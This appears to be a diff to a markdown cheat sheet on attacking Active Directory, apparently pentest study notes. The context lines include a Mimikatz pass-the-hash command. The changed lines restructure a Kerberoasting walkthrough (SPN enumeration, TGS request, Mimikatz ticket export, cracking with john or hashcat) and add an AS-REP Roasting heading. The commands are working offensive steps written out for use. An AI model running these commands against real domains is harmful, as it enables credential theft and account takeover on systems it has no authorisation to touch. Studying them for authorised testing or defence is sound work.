@@ -86,13 +86,17 @@ Invoke-Userhunter -CheckAccess : To confirm admin access
 - Invoke-Mimikatz -command '"sekurlsa::pth /user:studentx /domain:abc.local /ntlm: <ntlm hash of user studentx> /run:powershell.exe"' : This method is known as OverPasstheHash attack . This will open a new powershell process as studentx user.
   
  
-## Privilege Escalation Using Kerberos
+## Privilege Escalation 
 
-- Find User Account Used as Service Account
--      Get-NetUser -SPN
-- Requesting a TGS
--      Add-Type -AssemblyName System.IdentityModel 
--      New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName"
-- Export all ticket using Mimikatz
--      Invoke-Mimikatz -Command '"kerberos::list /export"'
-- Cracking the hash using john or hashcat
+- Kerberos
+  
+-     Find User Account Used as Service Account
+-          Get-NetUser -SPN
+-     Requesting a TGS
+-          Add-Type -AssemblyName System.IdentityModel 
+-          New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName"
+-     Export all ticket using Mimikatz
+-          Invoke-Mimikatz -Command '"kerberos::list /export"'
+-     Cracking the hash using john or hashcat
+  
+- AsRep Roasting
